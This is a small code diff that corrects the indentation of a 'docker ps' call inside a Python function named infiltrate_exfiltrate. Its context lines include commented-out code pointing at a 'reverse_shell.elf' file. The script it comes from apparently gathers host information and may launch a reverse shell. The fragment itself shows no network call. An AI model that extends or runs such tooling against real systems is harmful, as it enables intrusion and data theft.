@@ -48,12 +48,12 @@ def infiltrate_exfiltrate():
             check=True
         )
         with open("docker_ps_output.txt", "w") as docker_ps_file:
-        subprocess.run(
-            ["docker", "ps"],
-            stdout=docker_ps_file,
-            stderr=subprocess.DEVNULL,
-            check=True
-        )
+            subprocess.run(
+                ["docker", "ps"],
+                stdout=docker_ps_file,
+                stderr=subprocess.DEVNULL,
+                check=True
+            )
 
         # exe_path = os.path.join(clone_dir, "reverse_shell.elf")
         # if os.path.exists(exe_path):
